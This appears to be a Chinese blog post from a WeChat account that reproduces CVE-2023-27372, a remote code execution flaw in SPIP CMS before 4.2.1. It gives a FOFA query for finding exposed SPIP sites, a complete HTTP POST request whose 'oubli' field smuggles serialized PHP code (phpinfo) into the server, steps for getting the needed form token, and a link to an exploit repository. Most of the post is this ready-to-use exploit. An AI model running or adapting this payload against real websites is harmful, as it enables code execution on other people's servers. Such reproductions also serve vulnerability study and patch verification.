来自公众号： 小白嘿课
搜索公众号可查阅详情 有截图复现过程
本文链接：https://mp.weixin.qq.com/s/LDM3A8wZtHgTeM7An5sAzg

0x01 漏洞概述

漏洞编号：CVE-2023-27372

SPIP Cms v4.2.1之前版本允许通过公共区域中的表单值远程执行代码，因为序列化处理不当。

0x02 影响版本

SPIP  < 4.2.1
0x03 漏洞复现
方式一：FOFA语句：app="SPIP"


POST /spip/spip.php?page=spip_pass HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Cookie: cibcInit=oui
Content-Length: 215
Content-Type: application/x-www-form-urlencoded

page=spip_pass&formulaire_action=oubli&formulaire_action_args=JWFEz0e3UDloiG3zKNtcjKCjPLtvQ3Ec0vfRTgIG7u7L0csbb259X%2Buk1lEX5F3%2F09Cb1W8MzTye1Q%3D%3D&oubli=s:19:"<?php phpinfo(); ?>";&nobot=

这里formulaire_action_args参数需访问路径:/spip.php?page=spip_pass获取，标签为：input，name为:formulaire_action_args


page=spip_pass&formulaire_action=oubli&formulaire_action_args=JWFEz0e3UDloiG3zKNtcjKCjPLtvQ3Ec0vfRTgIG7u7L0csbb259X%2Buk1lEX5F3%2F09Cb1W8MzTye1Q%3D%3D&oubli=s:19:"<?php phpinfo(); ?>";&nobot=

通过上面的代码我们可以清楚的看到我们执行了 phpinfo()函数，执行结果如下。表示我们成功复现了该漏洞。

exp
https://github.com/Pari-Malam/CVE-2023-27372






